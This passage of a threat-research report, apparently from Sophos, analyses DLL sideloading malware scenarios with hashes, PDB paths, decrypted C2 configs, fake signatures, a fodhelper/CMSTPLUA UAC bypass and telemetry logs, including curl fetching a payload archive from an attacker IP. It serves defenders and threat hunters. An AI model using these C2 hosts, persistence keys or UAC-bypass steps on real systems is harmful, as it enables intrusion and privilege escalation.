<p>Moving on, we’ll dissect some of the more interesting activities we spotted during analysis. We’ll dissect one scenario from each of our five cases, and look in addition at two earlier finds that appear to be related to these cases. We should note that normally, we’d expect to see one scenario (clean loader + malicious loader + plugins) per case, but a couple of these cases literally doubled up. (Why they would do that is left as a conjecture for the reader.) For ease of reference, we’ll letter our scenarios – A, B, C, D, E – and identify the case to which it is related.</p>
<p>We discovered the two “extra” scenarios – F, G &#8212; by taking the information we had from our five cases and looking beyond our own data to see what other defenders might have already discovered but not yet flagged as part of a larger threat. They’re presented here to show how else these attacks might present to threat hunters, and to give some indication of just how long-running the threat might be.</p>
<p>Another of the interesting variations we found in this set of cases is that similar or identical configuration data is stored in multiple plugins. We’ll show this in detailed analysis of the specific plugins.</p>
<h3>From Case 1: Scenario A, the initial loader</h3>
<p>This was the initial infection, which consisted of the following components:</p>
<pre>c:\users\public\libraries\ciscocollabhost.exe : 
7b301cea1feff0add8de512a93ed7bc1b8330caf0c3a6f1585f9887b88db8efb 
(clean loader)
c:\users\public\libraries\ciscosparklauncher.dll : 
a73053f5410de74c8689d5a0da0df72adaa28055562626003d1b446c754d79e6 
(sideloader DLL)
c:\users\public\libraries\2831329086.inf (payload)</pre>
<h4>Implants</h4>
<p>The implant had the name 2831329086.inf, and was placed in the same directory as the sideloader DLL. We don’t have the implant, so we can only guess at its behavior based on the activity logs.</p>
<h3>From Case 2: Scenario B, the “cool client”</h3>
<p>The files belonging to this scenario were found in the downloaded c.rar described in Case 2.</p>
<p>This campaign was dubbed “Cool Client” by its developers, based on leftover development information in the components.</p>
<h4>Sideloader DLLs</h4>
<h4>libvlc.dll</h4>
<p>Compile time: 2021-May-10 19:40:05</p>
<p>PDB path: G:\project\木马\<strong>Cool\Client</strong>\hijack_export\libvlc\Release\libvlc.pdb</p>
<p>PDB File Name : G:\project\木马\Cool\Client\hijack_export\libvlc\Release\<strong>libvlc.pdb</strong><br />
(Translation of the Chinese text: <em>Trojan horse</em>)</p>
<p>Most of the libvlc exports are dummy (RET) functions that immediately exit &#8212; except for libvlc_new, which is the main function.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/11/image4.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-87830" src="https://news.sophos.com/wp-content/uploads/2022/11/image4.png" alt="Screenshot of a disassembly showing the libvlc_new function" width="640" height="509" srcset="https://news.sophos.com/wp-content/uploads/2022/11/image4.png 988w, https://news.sophos.com/wp-content/uploads/2022/11/image4.png?resize=300,239 300w, https://news.sophos.com/wp-content/uploads/2022/11/image4.png?resize=768,611 768w" sizes="auto, (max-width: 640px) 100vw, 640px" /></a></p>
<p><em>Figure 4: libvlc_new has a few things going on, in fact</em></p>
<p>The DLL has a default config structure. The config data is stored in a memory region. First it is initialized with the hardcoded config, and then this region is overwritten with whatever the decrypted content of time.sig isThe first value looks like an ID string for the config structure, the second one is an encryption key, and the third one should be the C2 address.</p>
<pre>cfg_find_tag
e4adbd50cf4e608d7cd3cf16022831ab
192.168.211.1</pre>
<p>These are default values, as indicated by the RFC 1918 IP address. To update with the real values, the process loads time.sig and decrypts the config info from it, overriding the default configuration with the target system’s actual configuration. During this process it:</p>
<ul>
<li>Replaces the default values in the memory with the new ones</li>
<li>Loads the implant file c:\programdata\GoogleUpdate\UpdateTime.ja</li>
<li>Installs itself as a service named gupdaten</li>
<li>Looks for the presence of c:\windows\system32\clb.dll. If the file is not found, the process terminates</li>
<li>If c:\programdata\GoogleUpdate\loader.ja does exist, the process decrypts and executes loader.ja</li>
<li>loader.ja is injected into the winver.exe process (process hollowing; we’ll have more to say about this technique in Scenario 3)</li>
<li>In addition to the default config, it contains the internal IP address 192.168.211.13. The purpose is unclear at this time.</li>
</ul>
<h4>Implants</h4>
<p>These are the encrypted modules that are loaded and executed during the infection process.</p>
<h4>Loader.ja</h4>
<p>Compile time: 2021-May-31 01:23:24</p>
<p>It appears to contain default config data, similar to libvlc.dll, and is likewise overwritten via time.sig</p>
<p>Relevant strings from the embedded config structure:</p>
<pre>cfg_find_tag
mark
group
192.168.211.1
e4adbd50cf4e608d7cd3cf16022831ab</pre>
<p>Another internal IP address, 192.168.211.13, is stored elsewhere.</p>
<p>The implant employs a <a href="https://gist.github.com/api0cradle/d4aaef39db0d845627d819b2b6b30512">UAC bypass using the CMSTPLUA COM interface</a>, and injects the created process into winver.exe. Processes are created for these files:</p>
<pre>c:\programdata\GoogleUpdate\goopdate.ja
c:\programdata\GoogleUpdate\session.ja</pre>
<p>This sequence:</p>
<ol>
<li>Stops the avp.exe process (avp.exe is the core component of Kaspersky’s antivirus solution; this is an attempt to evade detection)</li>
<li>Creates a registry autorun key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\goopdate</li>
<li>Adds a service called gupdaten</li>
</ol>
<h4>goopdate.ja</h4>
<p>Compile time: 2021-06-03 01:28:52</p>
<p>PDB path:</p>
<p>PDB File Name: G:\project\木马\Cool\Client\main\Release\main.pdb<br />
(Translation of the Chinese text: <em>Trojan horse</em>)</p>
<p>This file refers to several source files in its code, including:</p>
<pre>g:\project\..\cool\client\main\main\ckernelmanager.cpp
g:\project\..\cool\client\main\main\cmyudpclient.cpp
g:\project\..\cool\client\main\main\cmytcpclient.cpp</pre>
<p>As with previous examples, this implant contains default config data:</p>
<pre>cfg_find_tag
mark
group
e4adbd50cf4e608d7cd3cf16022831ab
192.168.211.153</pre>
<p>as well as the internal IP address 192.168.211.13.</p>
<p>This plugin registers the clean loader executable for autostart as a service. (As flagged above, this is a service claiming to be Google Update, but is actually a VLC media player executable.)</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/11/image5.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-87831" src="https://news.sophos.com/wp-content/uploads/2022/11/image5.png" alt="Screenshot of the Windows registry editor, showing the gupdaten service created as a key" width="640" height="172" srcset="https://news.sophos.com/wp-content/uploads/2022/11/image5.png 1228w, https://news.sophos.com/wp-content/uploads/2022/11/image5.png?resize=300,81 300w, https://news.sophos.com/wp-content/uploads/2022/11/image5.png?resize=768,206 768w, https://news.sophos.com/wp-content/uploads/2022/11/image5.png?resize=1024,275 1024w" sizes="auto, (max-width: 640px) 100vw, 640px" /></a></p>
<p><em>Figure 5: The new “service” gupdaten</em></p>
<h4>session.ja and UpdateTime.ja</h4>
<p>We didn’t obtain these implants. All we know is that loader.ja refers to them and would load them if they existed,</p>
<h4>time.sig</h4>
<p>This file contains encrypted config information, as shown in Figure 6:</p>
<pre class="Codesample">cfg_find_tag
None
machinetimeer
www.machinetimeer.com
www.machinetimeer.com
192.168.211.153
192.168.211.13
tests5
123456</pre>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/11/image6.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-87832" src="https://news.sophos.com/wp-content/uploads/2022/11/image6.png" alt="Hex dump of the config file, showing machinetimeer and machinetimeer.com" width="640" height="318" srcset="https://news.sophos.com/wp-content/uploads/2022/11/image6.png 682w, https://news.sophos.com/wp-content/uploads/2022/11/image6.png?resize=300,149 300w" sizes="auto, (max-width: 640px) 100vw, 640px" /></a></p>
<p><em>Figure 6: A look at the hex related to machinetimeer</em></p>
<h3>From Case 3: Scenario C, the VTCP gambit</h3>
<p>Code analysis shows that this scenario is built around vtcp.dll (the entirety of which is actually embedded into the main implant; it’s not just that the source code is linked into the plugin!) from the Trochilus RAT collection. These files were in the downloaded walk.rar archive.</p>
<h4>Sideloader DLLs</h4>
<h4>RzLog4CPP_Logger.dll</h4>
<p>Compile time: 2021-Aug-19 21:40:13</p>
<p>This contains a digital signature, seemingly from Google LLC (but really another self-signed fake):</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/11/image7.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-87833" src="https://news.sophos.com/wp-content/uploads/2022/11/image7.png" alt="Screenshot of digital signature details" width="640" height="705" srcset="https://news.sophos.com/wp-content/uploads/2022/11/image7.png 750w, https://news.sophos.com/wp-content/uploads/2022/11/image7.png?resize=272,300 272w" sizes="auto, (max-width: 640px) 100vw, 640px" /></a></p>
<p><em>Figure 7: A certificate that’s not what it claims to be</em></p>
<p>Thumbprint:    747EC25FDC3710E46D69135FAE8797718B967E25<br />
Algorithm:        sha256RSA<br />
Valid from:       5:52 AM 5/10/2021<br />
Valid to:             5:52 AM 5/10/2023</p>
<p>This uses the same code flow obfuscation as libvlc.dll. It loads and decrypts alloc.plg.</p>
<h4>Implants</h4>
<h4>alloc.plg</h4>
<p>Compile time: 2021-Aug-19 22:38:47</p>
<p>Contains an encrypted embedded PE, which has a Chinese PDB string:</p>
<p>Compile time: 2018-Feb-10 19:04:13<br />
PDB File Name : G:\ROOT\代码工程\木马\技巧收集\38dll\Release\38dll.pdb</p>
<p>(Translation: G:\ROOT\Code Project\Trojan\Trick Collection\38dll\Release\38dll.pdb)</p>
<p>The implant executes wusa.exe (and possibly grabs its process token).</p>
<p>As Microsoft describes it, this creates a new process and its primary thread; the new process runs the specified executable file in the security context of the specified credentials (user, domain, and password). It can optionally load the user profile for a specified user. Abuse of this technique was <a href="https://twitter.com/vk_intel/status/991226679380074496">previously noted by researcher Vitali Kremez in 2018</a> and is associated with the <a href="https://blog.talosintelligence.com/2016/09/tofsee-spam.html">Tofsee</a> plugin-based spambot. It is probably a Vault7 fileless AlwaysNotify UAC bypass, similar to <a href="https://gist.github.com/dezhub/c0fee68d1e06657a45ec39365362fca7">this one</a>.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/11/image8.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-87834" src="https://news.sophos.com/wp-content/uploads/2022/11/image8.png" alt="A disassembly of a UAC bypass function" width="640" height="119" srcset="https://news.sophos.com/wp-content/uploads/2022/11/image8.png 1476w, https://news.sophos.com/wp-content/uploads/2022/11/image8.png?resize=300,56 300w, https://news.sophos.com/wp-content/uploads/2022/11/image8.png?resize=768,143 768w, https://news.sophos.com/wp-content/uploads/2022/11/image8.png?resize=1024,190 1024w" sizes="auto, (max-width: 640px) 100vw, 640px" /></a></p>
<p><em>Figure 8: A UAC bypass in action</em></p>
<p>username: uac<br />
domain: is<br />
password: useless</p>
<p>This hollows free.plg into dllhost.exe. (<a href="https://attack.mitre.org/techniques/T1055/012/">Hollowing</a>, mentioned also in Scenario 2, is an attack in which a threat actor removes code in an executable, in this case dllhost, and embeds malicious code in order to trick the target machine into running the “trusted” executable.) Possible command-line parameters, which are passed to the clean loader when executed, include:</p>
<p>passuac<br />
online<br />
install</p>
<p>This uses <a href="https://gist.github.com/api0cradle/d4aaef39db0d845627d819b2b6b30512">UAC_Bypass_CMSTPLUA</a> and creates a service (InstallSvc) with the command &#8216;C:\ProgramData\Netsky\NetSky.exe online&#8217;.</p>
<h4>free.plg</h4>
<p>Compile time stamp: 2021-Aug-19 21:21:29</p>
<p>This stops the current service, creates the event Global\\ACT, then calls the sendSAS function of sas.dll with parameter 0. It then loads local.plg (if the service was found) and main.plg, all expected in C:\\ProgramData\\Netsky. main.plg is hollowed into a dllhost.exe process.</p>
<p>It opens C:\\ProgramData\\Netsky\\vs_session.dat, which appears to be a flag file (though we were unable to recover it for examination). If the file is not present, the process keeps checking in a loop.</p>
<h4>local.plg</h4>
<p>This contains the encrypted config, using a different encryption method than the implants. The decoded data contains these strings:</p>
<pre>cfg_find_tag
test
188.127.237.27
188.127.237.27
674e8fb2f2c8d8699200d56493722c90</pre>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/11/image9.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-87835" src="https://news.sophos.com/wp-content/uploads/2022/11/image9.png" alt="Hex dump of a config, showing an IP address" width="640" height="375" srcset="https://news.sophos.com/wp-content/uploads/2022/11/image9.png 1150w, https://news.sophos.com/wp-content/uploads/2022/11/image9.png?resize=300,176 300w, https://news.sophos.com/wp-content/uploads/2022/11/image9.png?resize=768,450 768w, https://news.sophos.com/wp-content/uploads/2022/11/image9.png?resize=1024,600 1024w" sizes="auto, (max-width: 640px) 100vw, 640px" /></a></p>
<p><em>Figure 9: A screenshot taken from a memory dump</em></p>
<h4>main.plg</h4>
<p>Compile time stamp: 2021-Aug-19 21:04:16</p>
<p>During installation this implant is hollowed into dllhost.exe. It contains the embedded vtcp.dll from the <a href="https://github.com/m0n0ph1/malware-1/blob/master/Trochilus/bin/Bin/vtcp.dll">Trochilus RAT collection</a>.</p>
<p>This DLL is loaded into memory, gets the exports from vtcp.dll, and uses them later in communication.</p>
<p>vtcp.dll uses CNetDiskClientSocket vftable functions for communication. It reads in and decrypts local.plg. It has a predefined hardcoded data structure that is overwritten with the decoded content. This hardcoded structure could be used in testing, or when there is no local.plg file found. The content of this hardcoded config is:</p>
<pre>cfg_find_tag
mark
192.168.211.1
192.168.211.1</pre>
<p>It registers the application as class “MSN Shessll &#8211; %d”; the number is generated by a call to the Windows API function GetTickCount. Next, it logs keystrokes to a file.  It creates dir.dat in both C:\\ProgramData\\Netsky and C:\Users\All Users. Both files will contain the name of the directory where the sideloading components were installed, in this case, C:\ProgramData\Netsky.</p>
<p>The process generates debug logs during execution, as shown in Figure 10:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/11/image10.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-87836" src="https://news.sophos.com/wp-content/uploads/2022/11/image10.png" alt="Screenshot showing events being logged" width="446" height="215" srcset="https://news.sophos.com/wp-content/uploads/2022/11/image10.png 446w, https://news.sophos.com/wp-content/uploads/2022/11/image10.png?resize=300,145 300w" sizes="auto, (max-width: 446px) 100vw, 446px" /></a></p>
<p><em>Figure 10: Logs generated by the process</em></p>
<h3>Case 4: Scenario D, the USB disk hijacker</h3>
<p>Based on the internal development info stored in the files, this scenario goes by the code name “U Disk Hijacking.”</p>
<h4>Sideloader DLLs</h4>
<h4><em>u2ec.dll</em></h4>
<pre>Creation Time   2021-09-01 09:23:30 UTC
First Submission 2022-01-02 04:07:47 UTC</pre>
<p>Contains the PDB path:</p>
<p>G:\project\APT\U盘劫持\new\u2ec\Release\u2ec.pdb</p>
<p>(Translation of Chinese text: U Disk Hijacking)</p>
<p>We found a variation of this file on VirusTotal. The only difference is some appended data:</p>
<pre>MD5 230c9a22104d5363d2e2738a6ac62b80
SHA-1   a693a273a23ec3ad274469492dc8db9f85f31c8f
SHA-256 a519c4e5dadd68c2301e65689857907941af23565bc19bb938fd3c51ff5f34ca</pre>
<h4><em>Implants</em></h4>
<p>The implants are stored in an encrypted format. They are decoded by the loader shellcode. These implants are DLL files with no exports; the main code is the entry code.</p>
<h4>usb.ini</h4>
<p>Interestingly, this artifact does not appear to do any C2 communication.</p>
<p>PDB File Name : G:\project\APT\U盘劫持\new\shellcode\Release\shellcode.pdb</p>
<p>(Chinese text: U Disk Hijacking)</p>
<p>The icon and the name of the executable spoofs a removable drive icon, thus tricking the victim into clicking on it. The directory listing would look as shown in Figure 11:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/11/image11.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-87837" src="https://news.sophos.com/wp-content/uploads/2022/11/image11.png" alt="Screenshot of a directory listing, showing a spoofed removable USB" width="316" height="398" srcset="https://news.sophos.com/wp-content/uploads/2022/11/image11.png 316w, https://news.sophos.com/wp-content/uploads/2022/11/image11.png?resize=238,300 238w" sizes="auto, (max-width: 316px) 100vw, 316px" /></a></p>
<p><em>Figure 11: The spoofed icon</em></p>
<p>Then a warning may be displayed:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/11/image12.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-87838" src="https://news.sophos.com/wp-content/uploads/2022/11/image12.png" alt="Screenshot of a Windows security warning" width="616" height="444" srcset="https://news.sophos.com/wp-content/uploads/2022/11/image12.png 616w, https://news.sophos.com/wp-content/uploads/2022/11/image12.png?resize=300,216 300w" sizes="auto, (max-width: 616px) 100vw, 616px" /></a></p>
<p><em>Figure 12: Windows flags the attempt to run the file, but the information the user sees inspires trust</em></p>
<p>However, because the executable is (apparently) clean and signed, the victims is not suspicious.</p>
<p>If it is not running from a path that contains ‘programdata’, it infects the computer and proceeds to do the following creation and copying actions:</p>
<p>It creates the installation directory udisk and copies document/image files there, then copies every file from the current directory (directory of GetModuleFileName) to c:\programdata\udisk.</p>
<p>It creates the following autorun key in the registry:</p>
<pre>HKCU\Software\Microsoft\Windows\CurrentVersion\Run   udisk

c:\programdata\udisk\disk_watch.exe</pre>
<p>It then copies itself to the following locations and executes those copies:</p>
<pre>c:\\programdata\\udisk\\disk_watch.exe
c:\\programdata\\udisk\\DateCheck.exe</pre>
<p>If it is running as disk_watch.exe, it infects USB disks by replicating itself there.</p>
<p>This is the timeline of the infection process from the logs:</p>
<p>First, u2ec.dll loads the payload:</p>
<pre>2022-05-02T03:26:54.419932Z   [ e:\usb drive.exe::13956 ]     === 
FileRead ===&gt;   [ e:\u2ec.dll ]
2022-05-02T03:26:55.212781Z   [ e:\usb drive.exe::13956 ]     === 
FileRead ===&gt;   [ e:\autorun.inf\protection for autorun\system 
volume information\usb.ini ]</pre>
<p>Then, files (documents created in the root by the user rather than the worm itself) are copied to the installation directory, as are instances of the worm and components of the other sideloading scenarios. After all that, an autorun registry key is created:</p>
<pre>2022-05-02T03:27:46.035555Z   [ e:\usb drive.exe::13956 ]     === 
RegKeySetValue ===&gt;   [ HKEY_USERS\S-1-5-21-2519359479-851945054-
3016455893-1321\SOFTWARE\Microsoft\Windows\CurrentVersion\Run ]
2022-05-02T03:27:46.198285Z   [ e:\usb drive.exe::13956 ]     === 
RegKeySetValue ===&gt;   [ 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows 
NT\CurrentVersion\Notifications\Data ]</pre>
<h3>Case 5: Scenario E, the Win10 UAC bypass</h3>
<p>The following components were used:</p>
<pre>c:\users\public\libraries\out\symstore.exe : 
83e51f9d467977238f9fa5107106918ed5102f1a3e06eeba9a33d21d5df49d6a
c:\users\public\libraries\out\symsrv.dll : 
9c2f1eeea169f2dd196bc9a0d240d941ccb5a22a050bca856c1a03fd795ac58d
c:\users\public\libraries\out\msvcrt.dll : 
d8cf89e651a2e1d9f8f653d16ecbca979d6c9459329a015ff825eff38792ed24</pre>
<p>In this case there is no additional encrypted payload file; the sideloaded DLL, symsrv.dll, is the payload itself.</p>
<h4>SYMSRV.dll</h4>
<p>PDB path:</p>
<p><em>C:\Users\admin\Desktop\djwklqjdlwqjldwqjlkfjwlqkjlqwjglqwjglqjlgjwqkjgk\SYMSRV.pdb</em></p>
<p>This is a 64-bit loader DLL that does a UAC bypass trick to execute commands, including the unidentified 3.exe component, as explained in <a href="https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/">this blog from PenTestLab</a>.</p>
<p>The implant executes various commands, which are inserted into the registry key <em>HKCU\ Classes\ms-settings\CurVer</em>. It then tries to execute two different Windows components, both of which are vulnerable to the UAC bypass method:</p>
<pre>c:\windows\system32\fodhelper.exe
c:\windows\system32\ComputerDefaults.exe</pre>
<p>When these clean Windows components are executed, they read the command to be executed from the registry key and run it with higher privileges.</p>
<p>We observed the following commands executed in this fashion:</p>
<pre>C:\\users\\public\\libraries\\3.exe
mkdir C:\\programdata\\googleupdate\
C:\\Users\\Public\\Libraries\\out\\googleupdate.exe</pre>
<p>The implant needs to make sure that another execution will not interfere, so it creates a flag in the registry: if it is set, some other command is in progress. The flag key is <em>HKCU\Classes\aaabbb32\shell\open\command</em>.</p>
<p>The threat actors show strong devotion to the DLL sideloading technique here. This UAC bypass method could have been compiled into any of their implants; instead, the simple logic has been implemented as a standalone sideloading scenario, and the debug features exploded the payload to a huge (1.1MB) DLL file.</p>
<h3>Scenario F: A connection to ShadowPad?</h3>
<p>As mentioned, a VirusTotal hunt led us to additional cases from non-Sophos sources. This case was found via VT hunting; it dates from January 2021, but the shared characteristics clearly connect it to our cases from 2022.</p>
<h4>Sideloader DLLs</h4>
<p>The following file was identified:</p>
<pre>73048579a2903918bbcc601cd562e8f93459ad2a562c6537006067b59735b7b6: log.dll
MD5        63971f35a4282343eced55ebdfd1cb0b
SHA-1    bee88779a9c65543a9cfa5069b4486131a23e55d
SHA-256 73048579a2903918bbcc601cd562e8f93459ad2a562c6537006067b59735b7b6
Creation Time 2021-01-25 05:43:52 UTC
Signature Date             05:48 AM 01/25/2021
First Submission         2022-01-26 05:43:49 UTC</pre>
<p>Signed by a self-signed digital signature claiming to originate from, but not actually originating from, Bitdefender:</p>
<pre>BitDefender SRL
Name      BitDefender SRL
Status This certificate or one of the certificates in the certificate chain is not 
time valid. The certificate or certificate chain is based on an untrusted root.
Issuer BitDefender SRL
Valid From       05:48 AM 01/25/2021
Valid To            05:48 AM 01/25/2022
Valid Usage     All
Algorithm         sha256RSA
Thumbprint       A9CA14BA90962DEA552F6A5FB2E5970ACF939EDE
Serial Number 01</pre>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/11/image13.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-87839" src="https://news.sophos.com/wp-content/uploads/2022/11/image13.png" alt="Screenshot of a digital certificate's signing details" width="640" height="477" srcset="https://news.sophos.com/wp-content/uploads/2022/11/image13.png 702w, https://news.sophos.com/wp-content/uploads/2022/11/image13.png?resize=300,224 300w" sizes="auto, (max-width: 640px) 100vw, 640px" /></a></p>
<p><em>Figure 13: The questionable digital certificate</em></p>
<p>It loads the payload from the file qutmain.dat.</p>
<p>This sideloading scenario consists of the following files:</p>
<pre>73048579a2903918bbcc601cd562e8f93459ad2a562c6537006067b59735b7b6 *log.dll
bcc588207d62a44149df54bd948815bdcfe60e7864bae00d6cd619f5d6cc2257 *qutload.dat
7529e60f377b24c60914ec909dbfdc0e60ad9e18fbf9750a4463acf33a7ce16f *qutmain.dat
386eb7aa33c76ce671d6685f79512597f1fab28ea46c8ec7d89e58340081e2bd *qutppy.exe
fb65524f27e847ac073a61d2c3eeae6a9447e34836347bbd7baff22a07cf0b01 *vsserver.dat</pre>
<p>Here, the .dat files are the encrypted plugins; quttpy.exe is the clean loader from Bitdefender (Bitdefender Crash Handler). The use of this clean file in sideloading scenarios has been reported (though with different payload files) since early 2021 and attributed to ShadowPad, aka <a href="https://news.sophos.com/en-us/2021/03/04/covert-code-faces-a-heap-of-trouble-in-memory/">NetSarang</a>. (Additionally, Trend Micro detects the encrypted .dat files as Trojan.Win32.SHADOWPAD.CGW.enc.) There is an additional file info.dat, which should contain the actual configuration data, but we weren’t able to recover it.</p>
<p>The log.dll loader uses the same obfuscation as the earlier cases, and the decrypted plugin files used the same shellcode loader. We believe this is a reasonably strong connection with the campaigns in 2022.</p>
<h4>Implants</h4>
<h4>qutmain.dat</h4>
<p>This file is essentially the same as alloc.plg. It refers to the following locations where the installed plugins are stored:</p>
<pre>C:\ProgramData\mos\qutppy.exe
C:\ProgramData\mos\qutload.dat
C:\ProgramData\mos\qutppy.exe online
C:\ProgramData\mos\info.dat
C:\ProgramData\mos\vsserver.dat
C:\ProgramData\mos\qutppy.exe install</pre>
<p>It generates similar debug messages with the <em>[fortest]</em> tag as well, and contains exactly the same UAC bypass component.</p>
<h4>qutload.dat</h4>
<p>This is the same as free.plg; only the file paths have changed to reflect the different scenario.</p>
<h4>vssserver.dat</h4>
<p>This is the same as main.plg. It contains the same hardcoded default config values:</p>
<pre>cfg_find_tag
mark
192.168.211.1
192.168.211.1</pre>
<h4>info.dat</h4>
<p>This is the encrypted configuration file. We haven’t been able to recover it.</p>
<h3>Scenario G: The old-timer</h3>
<p>This is a very early sample (from 2017!) that shows the same obfuscation as the newer cases, as well as a similar default hardcoded configuration. It was found via VT.</p>
<p>The file info:</p>
<pre>MD5        413bb0864c3933009a9cc486f07070e4
SHA-1    f5895c69c995ac8b7f01ff85df9777595fe8b35d
SHA-256 b2a332fb6e896a896f72e6bbbf6351d756f1ab6a57fbe662050ed1c18cad3e4b
Creation Time 2017-03-23 12:20:10 UTC
First Submission         2017-05-14 05:16:34 UTC</pre>
<p>Contains an embedded executable:</p>
<pre>389058c291b536eb65ba3a65e2024eb6350ff1a5ed48c036692bf5fed4729970</pre>
<p>Some characteristic strings from the embedded executable:</p>
<pre>hTTP/1.1 403 fORBIDDENRNRN&lt;h1&gt;403 fORBIDDEN&lt;/h1&gt;
HtTp/1.0 200 OKRNRN
192.168.1.2</pre>
<p>Also, a similar config data is stored, but with a different marker at the beginning:</p>
<pre>mmconfig-tag
192.168.1.33
KarSpy
KarSpy
Kar security services</pre>
<p>Sideloading components could be identified from the code:</p>
<pre>%CommonProgramFiles%\Sandboxie\SbieDll.dll
%CommonProgramFiles%\Sandboxie\Sandboxie.exe
%CommonProgramFiles%\Sandboxie</pre>
<p>The malicious DLL is attributed as gh0st RAT. Details of the payload are unavailable at this time.</p>
<h2>Appendix: A Tour of the Worm Circus</h2>
<p>From our telemetry data we reconstructed the steps of the infection process. Here’s the timeline for Case 4 (“Worm Circus,”) the most complex attack. This is the one that both delivered a USB worm in its payload and ingested portions of other APTs:</p>
<p>Execution of initial sideloading:</p>
<pre>2022-06-24T03:11:11.519857Z      [ 
c:\users\public\libraries\ciscocollabhost.exe::38752 ]    === FileRead ===&gt;
     [ c:\users\public\libraries\ciscosparklauncher.dll ]
2022-06-24T03:11:11.519857Z      [ 
c:\users\public\libraries\ciscocollabhost.exe::38752 ]    === FileRead ===&gt;
     [ c:\users\public\2831329086.inf ]
Downloading the RAR archive
2022-06-24T04:02:58.673626Z      [ c:\windows\syswow64\curl.exe::36336 ]
    === IpConnector ===&gt;   [ 103.253.72.116 ]
2022-06-24T04:02:58.793284Z      [ c:\windows\syswow64\curl.exe::36336 ]    
=== FileWrite ===&gt;       [ c:\users\public\libraries\out\v1.rar ]</pre>
<p>Unpacking the files of the second sideloading:</p>
<pre>2022-06-24T04:03:54.211485Z      [ c:\program files\winrar\rar.exe::39988 ]     
=== FileWrite ===&gt;    [ c:\users\public\libraries\out\symsrv.dll ]
2022-06-24T04:03:54.243728Z      [ c:\program files\winrar\rar.exe::39988 ]     
=== FileWrite ===&gt;    [ c:\users\public\libraries\out\symstore.exe ]
2022-06-24T04:03:54.249938Z      [ c:\program files\winrar\rar.exe::39988 ]     
=== FileWrite ===&gt;    [ c:\users\public\libraries\out\msvcrt.dll ]
2022-06-24T04:03:54.263187Z      [ c:\program files\winrar\rar.exe::39988 ]     
=== FileRead ===&gt;    [ c:\users\public\libraries\out\v1.rar ]</pre>
<p>This shows execution of the second sideloading attack, which creates registry keys to register a custom file extension and a custom command to open files of that extension. This could be a persistence tactic, similar to <a href="https://news.sophos.com/en-us/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence/">how SolarMarker does it</a>.</p>
<pre>2022-06-24T04:05:43.119771Z      [ 
c:\users\public\libraries\out\symstore.exe::39668 ]    === FileRead ===&gt;
     [ c:\users\public\libraries\out\symsrv.dll ]
2022-06-24T04:05:43.159707Z      [ 
c:\users\public\libraries\out\symstore.exe::39668 ]    === RegKeyCreate ===&gt;
     [ HKEY_USERS\S-1-5-21-1497078658-3044148255-4064547459-
1001_<strong>Classes\aaabbb32\shell\open\command</strong> ]
2022-06-24T04:05:43.160709Z      [ 
c:\users\public\libraries\out\symstore.exe::39668 ]    === RegKeySetValue 
===&gt;       [ HKEY_USERS\S-1-5-21-1497078658-3044148255-4064547459-
1001_Classes\aaabbb32\shell\open\command ]
2022-06-24T04:05:43.161131Z      [ 
c:\users\public\libraries\out\symstore.exe::39668 ]    === RegKeyCreate ===&gt; 
       [ <strong>HKEY_USERS\S-1-5-21-1497078658-3044148255-4064547459-1001_Classes\ms-</strong>
<strong>settings\CurVer</strong> ]
2022-06-24T04:05:43.162128Z      [ 
c:\users\public\libraries\out\symstore.exe::39668 ]    === RegKeySetValue 
===&gt;       [ HKEY_USERS\S-1-5-21-1497078658-3044148255-4064547459-
1001_Classes\ms-settings\CurVer ]</pre>
<p>Creation of yet another 3.exe file (symstore.exe -&gt; fodhelper.exe -&gt; 3.exe)</p>
<pre>2022-06-24T04:05:43.318703Z      [ 
c:\users\public\libraries\out\symstore.exe::39668 ]    === FileRead ===&gt;
     [ c:\windows\system32\fodhelper.exe ]
2022-06-24T04:05:44.215109Z      [ c:\windows\system32\fodhelper.exe::26224 ]
      === FileRead ===&gt;     [ c:\users\public\libraries\3.exe ]          
2022-06-24T04:05:44.240169Z      [ c:\users\public\libraries\3.exe::42928 ] 
      === FileRead ===&gt;       [ c:\windows\syswow64\hmpalert.dll ]
2022-06-24T04:05:44.242168Z      [ c:\users\public\libraries\3.exe::42928 ] 
      === FileRead ===&gt;       [ c:\windows\system32\conhost.exe ]</pre>
<p>Fodhelper.exe executes 3.exe. But before that, the registry key HKEY_USERS\S-1-5-21-1497078658-3044148255-4064547459-1001_Classes\ms-settings\CurVer is created. This is likely a UAC bypass method similar to the one Pentestlab <a href="https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/">described</a> in 2017 and more <a href="https://threatpost.com/trickbot-switches-to-a-new-windows-10-uac-bypass-to-evade-detection/152477/">recently used</a> by Trickbot.</p>
<p>The threat actor then executed 3.exe, which deletes the components of sideloading scenarios. Note the presence of the files nvsmartmax.dll and nvsmartmax.dat. <a href="https://www.cybereason.com/blog/research/deadringer-exposing-chinese-threat-actors-targeting-major-telcos">Cybereason has previously reported</a> that they are used by a Chinese APT group in their attacks.</p>
<pre>2022-06-24T04:05:44.568617Z      [ c:\users\public\libraries\3.exe::42928 ]
      === FileDelete ===&gt;    [ c:\programdata\googleupdate\googleupdate.exe ]
2022-06-24T04:05:44.570493Z      [ c:\users\public\libraries\3.exe::42928 ] 
      === FileDelete ===&gt;    [ c:\programdata\googleupdate\goopdate.ja ]
